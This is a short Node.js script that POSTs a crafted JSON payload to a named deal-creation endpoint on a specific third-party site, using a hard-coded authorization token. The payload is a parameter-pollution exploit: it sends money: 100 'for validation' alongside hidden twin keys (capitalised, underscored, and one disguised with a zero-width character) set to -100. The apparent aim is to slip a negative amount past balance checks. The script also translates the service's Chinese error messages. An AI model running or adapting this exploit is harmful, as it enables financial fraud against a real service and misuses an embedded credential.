const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));

const endpoint = 'https://fnn02.vip/api_deal/load/create';
const authHeader = 'TERc/9260xgILO4HuXsdtru5hUy4NZjhpkzd/DhE6dFVY5F/OeFmjKcyxdgfTmEri7QVcxVVCuCp9Gg95K1nIlSKv4Rl3pyHzkJR0ji1yw2Nqzp0srkvQoGkRHPBb8ydi99aFnkR00PeDAqHjmTAHY2mdp9pgnfKrAo3Aa7BwIU='

// Inject invisible char key: 'money' + U+200C (zero-width non-joiner)
const zeroWidthKey = 'money\u200C';

// Payload with multiple variants
const payload = {
  deal_id: 7,
  money: 100,         // for validation
  Money: -100,        // capital case
  money_: -100,       // trailing underscore
  [zeroWidthKey]: -100 // hidden twin
};

// Error translator
const translateError = (chinese) => {
  const dict = {
    "账户余额不足": "Insufficient account balance",
    "质押金额过低": "Pledged amount too low",
    "请选择一个有效的交易": "Please select a valid deal"
  };
  return dict[chinese] || "Unknown error: " + chinese;
};

(async () => {
  try {
    const response = await fetch(endpoint, {
      method: 'POST',
      headers: {
        'Authorization': authHeader, // Replace
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    });

    const contentType = response.headers.get('content-type');
    const raw = await response.text();

    if (contentType && contentType.includes('application/json')) {
      const json = JSON.parse(raw);
      console.log('✅ JSON:', json);

      if (json.error && /[\u4e00-\u9fa5]/.test(json.error)) {
        console.log('🈶 Translated Error:', translateError(json.error));
      }
    } else {
      console.log('⚠️ Non-JSON response:\n', raw.slice(0, 300));
    }
  } catch (error) {
    console.error('❌ Request failed:', error.message);
  }
})();
